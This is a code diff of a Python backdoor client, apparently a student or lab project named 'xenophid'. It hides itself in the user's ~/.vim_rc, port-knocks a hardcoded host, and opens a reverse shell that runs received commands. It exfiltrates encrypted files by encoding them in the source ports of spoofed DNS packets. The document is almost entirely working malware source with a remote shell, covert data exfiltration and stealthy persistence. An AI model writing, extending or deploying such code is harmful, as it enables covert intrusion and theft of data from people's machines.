@@ -1,15 +1,5 @@
 from os.path import expanduser
-import socket,subprocess
-from dcutils import generate_password, encrypt
-from scapy.all import *
 
-
-PORT = 4433            # The same port as used by the server
-DESTINATION = "192.168.0.25"
-EOF = "G"
-EOL = "Z"
-PORT_KNOCKER = [8000,7000,6000,5000,4000,3000,2000,1000]
-PASS = ""
 
 def change_settings():
     home = expanduser("~")
@@ -18,12 +8,26 @@ def change_settings():
 
     with open("xenophid.py") as somefile:
         with open(home + "/.vim_rc", "a") as hidefile:
-            for i in xrange(13):
+            for i in xrange(16):
                 somefile.next()
             for line in somefile:
                 hidefile.write(line)
 
-def upload(s,cmdArg):
+
+import os.path
+import socket, subprocess
+from dcutils import generate_password, encrypt
+from scapy.all import *
+
+PORT = 4433  # The same port as used by the server
+DESTINATION = "192.168.0.25"
+EOF = "G"
+EOL = "Z"
+PORT_KNOCKER = [8000, 7000, 6000, 5000, 4000, 3000, 2000, 1000]
+PASS = ""
+
+
+def upload(s, cmdArg):
     fs = cmdArg[2]
     with open(cmdArg[1], "wb") as f:
         dr = s.recv(1024)
@@ -36,6 +40,7 @@ def upload(s,cmdArg):
                 totalFS += len(dr)
             else:
                 break
+
 
 def create_inside_out_connection():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -52,34 +57,67 @@ def create_inside_out_connection():
         if cmdArg[0] == "quit":
             break
         elif cmdArg[0] == "upload":
-            upload(s,cmdArg)
+            upload(s, cmdArg)
+        elif cmdArg[0] == "download":
+            # call encrypt function - returns file size or data?
+            # read file - return file data
+            # encrypt file data - return character length
+            fileInformation = encrypt_data(cmdArg[1])
+            if fileInformation[0] == 0:
+                s.send(str(fileInformation[0]))
+                print "not valid file."
+            else:
+                s.send(str(fileInformation[1])) #send file name + " " + filesize
+                time.sleep(2)
+                send_data(fileInformation[0])
+                time.sleep(3)
+                send_data(EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF)
+                print fileInformation[0]
+            # send encrypted data using covert + delay + EOF bomb
+        elif data == '':
+            break
         else:
             # do shell command
-            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                    stdin=subprocess.PIPE)
             # read output
             stdout_value = proc.stdout.read() + proc.stderr.read()
+            if stdout_value == '':
+                stdout_value = 'Command had no output.\n'
+            s.send(stdout_value)
+
             # send output to attacker
-            #for line in stdout_value.splitlines():
+            # for line in stdout_value.splitlines():
             #    send_data(line,EOL)
-            #send(make_packet(EOF,0))
-            time.sleep(2)
-            send_data(stdout_value,EOF)
+            # send(make_packet(EOF,0))
+            #time.sleep(2)
+            #send_data(stdout_value, EOF)
     # close socket
     s.close()
 
-def send_data(line,diviser):
-    global PASS
-    encryptedString = encrypt(line, PASS)
-    sendContent = encryptedString+diviser
-    print line
-    print sendContent
-    print len(sendContent)
-    for i in range(0,len(sendContent),2):
-        new_packet = make_packet(sendContent[i],sendContent[i+1] if i < len(sendContent) - 1 else 0 )
+
+def encrypt_data(filePath):
+    if os.path.isfile(filePath):
+        with open(filePath, "rb") as fileToDownload:
+            encryptedFileContent = encrypt(fileToDownload.read(), PASS)
+            return [encryptedFileContent, len(encryptedFileContent)]
+    else:
+        return [0]
+
+def send_data(sendContent):
+    #global PASS
+    #encryptedString = encrypt(line, PASS)
+    #sendContent = encryptedString + diviser
+    #print line
+    #print sendContent
+    #print len(sendContent)
+    for i in range(0, len(sendContent), 2):
+        new_packet = make_packet(sendContent[i], sendContent[i + 1] if i < len(sendContent) - 1 else 0)
         print i
         send(new_packet)
 
-def make_packet(char1,char2):
+
+def make_packet(char1, char2):
     firstCharHex = hex(ord(char1))[2:]
     secondCharHex = 0
     if char2 != 0:
@@ -91,28 +129,32 @@ def make_packet(char1,char2):
         secondCharHex = '2e'
         CovertSourcePort = int(firstCharHex + secondCharHex, 16)
 
-    packet=IP(src=DESTINATION, dst=DESTINATION)/UDP(sport=CovertSourcePort)/DNS(rd=1, qd=DNSQR(qname="google.com"))
+    packet = IP(src=DESTINATION, dst=DESTINATION) / UDP(sport=CovertSourcePort) / DNS(rd=1,
+                                                                                      qd=DNSQR(qname="google.com"))
     return packet
 
-def generate_sport(char1,char2):
-	firstCharHex = hex(ord(char1))[2:]
-	secondCharHex = hex(ord(char2))[2:]
-	sourcePort = 11822
-	if secondCharHex != 0:
-		sourcePort = int(firstCharHex + secondCharHex, 16)
-	else:
-		secondCharHex = '2e'
-		sourcePort = int(firstCharHex + secondCharHex, 16)
-	return sourcePort
+
+def generate_sport(char1, char2):
+    firstCharHex = hex(ord(char1))[2:]
+    secondCharHex = hex(ord(char2))[2:]
+    sourcePort = 11822
+    if secondCharHex != 0:
+        sourcePort = int(firstCharHex + secondCharHex, 16)
+    else:
+        secondCharHex = '2e'
+        sourcePort = int(firstCharHex + secondCharHex, 16)
+    return sourcePort
+
 
 def port_knocking(password):
     pass_index = 0
     for i in range(len(PORT_KNOCKER)):
-        s_port = generate_sport(password[pass_index],password[pass_index+1])
-        packet=IP(dst=DESTINATION)/UDP(sport=s_port ,dport=PORT_KNOCKER[i])
+        s_port = generate_sport(password[pass_index], password[pass_index + 1])
+        packet = IP(dst=DESTINATION) / UDP(sport=s_port, dport=PORT_KNOCKER[i])
         pass_index += 2
         send(packet)
     time.sleep(2)
+
 
 def start_client():
     global PASS
@@ -120,9 +162,11 @@ def start_client():
     port_knocking(PASS)
     create_inside_out_connection()
 
+
 def main():
-    change_settings()
+    #change_settings()
     start_client()
 
+
 if __name__ == '__main__':
-	main()
+    main()
